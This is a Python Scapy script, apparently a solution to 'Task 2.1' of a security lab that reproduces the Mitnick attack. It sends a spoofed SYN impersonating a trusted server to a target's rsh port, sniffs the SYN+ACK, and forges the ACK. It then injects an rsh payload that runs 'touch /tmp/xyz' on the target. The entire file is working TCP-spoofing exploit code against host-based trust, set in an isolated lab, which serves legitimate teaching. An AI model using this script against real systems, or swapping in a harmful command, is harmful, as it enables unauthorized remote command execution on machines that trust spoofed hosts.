#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import threading

X_IP = "10.9.0.5"
SERVER_IP = "10.9.0.6"
IFACE = "br-50741950180a"
RSH_PORT = 9090  # Port for second connection (can be any)


def send_syn():
    time.sleep(2)
    print("[1] Sending spoofed SYN (Trusted Server -> X-Terminal)...")
    ip = IP(src=SERVER_IP, dst=X_IP)
    tcp = TCP(sport=1023, dport=514, flags="S", seq=1000)
    send(ip / tcp, verbose=0)


def spoof_reply(pkt):
    if (pkt.haslayer(TCP) and pkt[TCP].flags == "SA" and
            pkt[IP].src == X_IP and pkt[TCP].sport == 514 and
            pkt[IP].dst == SERVER_IP and pkt[TCP].dport == 1023):
        print("[2] Got SYN+ACK from X-Terminal!")
        seq = pkt[TCP].seq
        ack = pkt[TCP].ack

        ip = IP(src=SERVER_IP, dst=X_IP)
        tcp = TCP(sport=1023, dport=514, flags="A", seq=ack, ack=seq + 1)
        print("[3] Sending spoofed ACK...")
        send(ip / tcp, verbose=0)

        rsh_data = f"{RSH_PORT}\x00seed\x00seed\x00touch /tmp/xyz\x00"
        tcp_data = TCP(sport=1023, dport=514, flags="PA", seq=ack, ack=seq + 1)
        print("[4] Sending RSH payload (touch command)...")
        send(ip / tcp_data / rsh_data, verbose=0)

        print("[+] Task 2.1 COMPLETE!")
        print("[*] Check /tmp/xyz on X-Terminal.")
        print("[*] Press Ctrl+C to exit.")
        return


if __name__ == "__main__":
    print("[*] Starting Task 2.1: Spoof First TCP Connection")
    syn_thread = threading.Thread(target=send_syn)
    syn_thread.start()
    sniff(filter=f"tcp and src host {X_IP} and src port 514",
          prn=spoof_reply,
          iface=IFACE,
          store=0)
